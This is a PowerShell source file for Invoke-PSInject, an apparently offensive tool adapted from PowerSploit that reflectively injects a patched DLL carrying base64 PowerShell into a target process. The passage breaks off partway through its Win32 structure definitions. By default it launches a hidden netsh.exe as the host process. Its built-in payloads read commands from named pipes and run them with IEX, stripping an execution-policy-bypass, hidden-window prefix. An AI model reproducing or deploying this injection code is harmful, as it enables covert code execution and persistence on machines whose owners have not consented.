function Invoke-PSInject
{
 <#
.SYNOPSIS
Taskes a PowerShell script block (base64-encoded), patches
the decoded logic into the architecture appropriate ReflectivePick
.dll, and injects the result into a specified ProcessID.

Adapted from PowerSploit's Invoke-RefleciveDLLInjection codebase

.PARAMETER ProcId
Process to inject ReflectivePick into

.PARAMETER PoshCode
Base64-encoded PowerShell code to inject.
#>


[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void', 'Other' )]
    [String]
    $FuncReturnType = 'Other',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,
    
    [Parameter(Position = 6)]
    [String]
    $PoshCode,

    [Parameter(Position = 7)]
    [Switch]
    $ForceASLR,

    [Parameter(Position = 8)]
    [String]
    $PayloadType
)

    Set-StrictMode -Version 2
    
    if (!$ProcId) {
    $pst = New-Object System.Diagnostics.ProcessStartInfo
    $pst.WindowStyle = 'Hidden'
    $pst.UseShellExecute = $False
    $pst.CreateNoWindow = $True
    $pst.FileName = "C:\Windows\System32\netsh.exe"
    $Process = [System.Diagnostics.Process]::Start($pst)
    [UInt32]$ProcId = ($Process.Id).tostring()    
    }

    echo "Injecting into process ID: $ProcID"
    
    if (!$PoshCode){
        if ($PayloadType -eq "Proxy") {
            $PoshCode = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace `"powershell -exec bypass -Noninteractive -windowstyle hidden -e `",`"`"))))"
        }
        if ($PayloadType -eq "PS") {
            $PoshCode = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace `"powershell -exec bypass -Noninteractive -windowstyle hidden -e `",`"`"))))"
        }
    }

    function Invoke-PatchDll {
        <#
        .SYNOPSIS
        Patches a string in a binary byte array.

        .PARAMETER DllBytes
        Binary blog to patch.

        .PARAMETER FindString
        String to search for to replace.

        .PARAMETER ReplaceString
        String to replace FindString with
        #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [string]
            $FindString,

            [Parameter(Mandatory = $True)]
            [string]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($ReplaceString)

        $index = 0
        $s = [System.Text.Encoding]::UNICODE.GetString($DllBytes)
        $index = $s.IndexOf($FindString) * 2
        Write-Verbose "patch index: $index"

        if($index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$index+$i]=$ReplaceStringBytes[$i]
        }

        # null terminate the replaced string
        $DllBytes[$index+$ReplaceStringBytes.Length] = [byte]0x00
        $DllBytes[$index+$ReplaceStringBytes.Length+1] = [byte]0x00

        $replacestart = $index
        $replaceend = $index + $ReplaceStringBytes.Length
        write-verbose "replacestart: $replacestart"
        write-verbose "replaceend: $replaceend"

        $NewCode=[System.Text.Encoding]::Unicode.GetString($RawBytes[$replacestart..$replaceend])
        write-verbose "Replaced pattern with: $NewCode"
        
        return $DllBytes
    }


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR,
        
        [Parameter(Position = 5, Mandatory = $true)]
        [String]
        $PoshCode
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
